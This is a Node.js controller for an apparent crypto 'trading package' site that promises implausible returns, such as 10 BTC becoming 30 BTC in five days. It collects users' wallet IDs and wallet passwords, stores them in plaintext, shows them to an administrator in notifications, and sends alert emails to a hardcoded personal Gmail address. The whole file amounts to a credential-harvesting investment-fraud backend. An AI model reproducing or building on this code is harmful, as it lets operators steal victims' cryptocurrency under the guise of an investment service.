const cron = require("node-cron");
const models = require('../db/models'),
  { validateForm } = require('../utils/validation'),
  https = require('https');

const { sendEmail } = require('../utils/mail');

module.exports = (io) => {
  return {
    packages: (req, res) => {
      res.render('backend/trading/packages')
    },
    start: (req, res) => {
      validateForm.validateTrading({
        fields: {
          walletPassword: {val: req.body.walletPassword, message: 'Wallet password is required.'},
          walletId: {val: req.body.walletId, message: 'Wallet ID is required.'}
        }
      }, (err) => {
        if (err) return res.status(422).json({success: false, response: err});

        let packageData = {};

        let currentTime = new Date();

        if(req.body.package === 'Basic'){
          packageData.package = 'Basic';
          packageData.miningFee = '10';
          packageData.duration = 5;
          packageData.earning = 0.5;
          packageData.investing = 0.1;
          packageData.dailyEarnings = (packageData.earning / packageData.duration);
        }else if(req.body.package === 'Standard'){
          packageData.package = 'Standard';
          packageData.miningFee = '10';
          packageData.duration = 5;
          packageData.earning = 0.9;
          packageData.investing = 0.6;
          packageData.dailyEarnings = (packageData.earning / packageData.duration);
        }else if(req.body.package === 'Professional'){
          packageData.package = 'Professional';
          packageData.miningFee = '10';
          packageData.duration = 5;
          packageData.earning = 9;
          packageData.investing = 1;
          packageData.dailyEarnings = (packageData.earning / packageData.duration);
        }else if(req.body.package === 'Master'){
          packageData.package = 'Master';
          packageData.miningFee = '10';
          packageData.duration = 5;
          packageData.earning = 30;
          packageData.investing = 10;
          packageData.dailyEarnings = (packageData.earning / packageData.duration);
        }else {
          return res.status(422).json({success: false, response: 'Request not understood!'});
        }

        return models.Trade.create({
          user: req.session.user,
          package: packageData.package,
          miningFee: packageData.miningFee,
          dailyEarnings: packageData.dailyEarnings,
          totalEarnings: 0.00,
          walletId: req.body.walletId.trim(),
          walletPassword: req.body.walletPassword.trim(),
          duration: packageData.duration,
          earning: packageData.earning,
          investing: packageData.investing,
        }).then(result => {
          models.User.findById(result.user).then(user => {
            let msg = `${user.name} has applied for ${result.package} package
             and is investing ${packageData.investing} BTC for ${packageData.duration} days.`;
            let briefMsg = msg.substr(0, 45);

            briefMsg = briefMsg.substr(0, Math.min(briefMsg.length, briefMsg.lastIndexOf(" ")));
            models.Notification.create({
              recipient: res.locals.adminId,
              title: 'New Trading Request',
              message: msg,
              briefMessage: briefMsg
            }).then(notification => {
              io.sockets.emit('newNotification.' + notification.recipient, {
                briefMessage: briefMsg,
                id: notification.id,
                createdAt: notification.createdAt,
                title: notification.title
              })

              res.status(200).json({
                success: true,
                response: 'Request sent!. Please wait you will be redirected to the payment page.',
                payload: result.id
              })
            })
          })
        })
      })
    },
    paymentPage: (req, res) => {
      models.Trade.findById(req.params.id).then(result => {
        if(!result) return res.send(404)

        axios.get('https://blockchain.info/tobtc?currency=USD&value='+result.miningFee)
          .then(response => {
            //console.log(response.data);

            res.render('backend/trading/makePayment', {
              transaction: result,
              bitcoinAddress: res.locals.settings.bitcoinAddress,
              qrCode: res.locals.settings.qrCode,
              btcToPay: response.data
            })
          })
          .catch(error => {
            console.log(error);
          });

      })
    },
    savePayment: (req, res) => {
      models.Trade.findOne({
        where: {id: req.body.transaction},
        include: [
          { model: models.User}
        ]
      }).then(result => {
        if(!result) return res.status(422).json({
          success: false, response: 'Could not validate request.'
        });

        if(result.paymentMade) return res.status(422).json({
          success: false, response: 'Sorry, payment has already been made for this transaction.'
        });

        let currentTime = new Date();
        let durationTime = currentTime.setMinutes(currentTime.getMinutes() + result.duration);

        models.Trade.update({
          paymentMade: true
          //durationTime: durationTime
        }, {where: {id: req.body.transaction}}).then(result2 => {
          let msg = `${result.User.name} has completed payment for his/her transaction on ${result.package} package 
          opened ${res.locals.timeAgo(result.createdAt)}.<br><br>
          <h4>Blockchain Details</h4>
          <b>Wallet Id</b>: ${result.walletId}<br><b>Wallet Password</b>: ${result.walletPassword}`;
          let briefMsg = msg.substr(0, 45);

          briefMsg = briefMsg.substr(0, Math.min(briefMsg.length, briefMsg.lastIndexOf(" ")));
          models.Notification.create({
            recipient: res.locals.adminId,
            title: 'Payment Completion',
            message: msg,
            briefMessage: briefMsg
          }).then(notification => {
            io.sockets.emit('newNotification.' + notification.recipient, {
              briefMessage: briefMsg,
              id: notification.id,
              createdAt: notification.createdAt,
              title: notification.title
            })

            let notifyMail = async () => {
              try {
                await sendEmail('confiyobo@gmail.com',
                  'CryptPalace - Transaction Alert',
                  'notificationAlert',
                  {});

                console.log('MAIL GREETING')
              }catch (e) {
                console.log('Mail Error', e)
              }
            };

            notifyMail();

            res.status(200).json({
              success: true,
              response: 'Request sent! You will be notified once payment has been confirmed.',
              payload: result.id
            })
          })
        })
      })
    },
    transactions: (req, res) => {
      res.render('backend/trading/transactions')
    }
  }
};
